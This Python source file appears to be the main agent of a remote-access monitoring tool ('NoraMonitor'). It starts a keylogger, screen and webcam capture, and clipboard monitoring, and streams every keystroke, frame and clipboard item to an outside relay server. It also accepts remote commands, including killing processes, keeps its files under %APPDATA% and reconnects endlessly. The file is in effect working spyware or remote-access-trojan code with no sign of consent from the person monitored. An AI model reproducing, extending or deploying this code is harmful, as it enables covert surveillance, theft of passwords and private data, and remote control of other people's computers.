import os
import socket
import traceback

# ── Update this URL after deploying nora-relay ────────────────────────────────
RELAY_URL = os.environ.get("NORA_RELAY", "https://YOUR-RELAY.up.railway.app")

import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb
import socketio

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=3,
                      reconnection_delay_max=10, logger=False, engineio_logger=False)
_camera = None


def _log(msg):
    try:
        with open(os.path.join(_APP_DIR, "nora.log"), "a") as f:
            import datetime
            f.write(f"{datetime.datetime.now()} {msg}\n")
            f.flush()
    except Exception:
        pass


def _emit(event, data):
    try:
        sio.emit(event, data)
    except Exception:
        pass


def broadcast_frame(b64):      _emit("frame",        {"data": b64})
def broadcast_key(char):       _emit("key",           {"char": char})
def broadcast_camera(b64):     _emit("camera_frame",  {"data": b64})
def broadcast_clipboard(text): _emit("clipboard",     {"text": text})


@sio.event
def connect():
    _log(f"Relay connected")
    sio.emit("register", {"name": socket.gethostname()})


@sio.event
def disconnect():
    _log("Relay disconnected — will reconnect")


@sio.event
def ok():
    _log("Registered with relay OK")


@sio.on("command")
def on_command(data):
    try:
        controller.handle_command(data)
    except Exception:
        pass


@sio.on("request_processes")
def on_req_proc(data):
    import processes as proc
    _emit("processes_data", proc.get_processes())


@sio.on("kill_process")
def on_kill(data):
    import processes as proc
    pid = data.get("pid")
    if pid:
        proc.kill_process(int(pid))
        _emit("processes_data", proc.get_processes())


@sio.on("camera_on")
def on_cam_on(data):
    global _camera
    if _camera:
        ok = _camera.start()
        _emit("camera_state", {"active": ok})


@sio.on("camera_off")
def on_cam_off(data):
    global _camera
    if _camera:
        _camera.stop()
        _emit("camera_state", {"active": False})


def main():
    global _camera
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)
    _log("Nora starting")

    try:
        _log("Init recorder")
        recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
        _log("Init camera")
        _camera = cam.CameraCapture(on_frame=broadcast_camera, fps=10, quality=55)
        _log("Init keylogger")
        kl.Keylogger(broadcast_key).start()
        _log("Init screencap")
        capture = sc.ScreenCapture(broadcast_frame, fps=12, quality=55, scale=0.6)
        capture.attach_recorder(recorder)
        capture.start()
        _log("Init clipboard")
        cb.ClipboardMonitor(broadcast_clipboard).start()
        _log(f"Connecting to relay: {RELAY_URL}")
        sio.connect(RELAY_URL, transports=["websocket", "polling"])
        sio.wait()
    except Exception:
        _log("CRASH:\n" + traceback.format_exc())


if __name__ == "__main__":
    main()
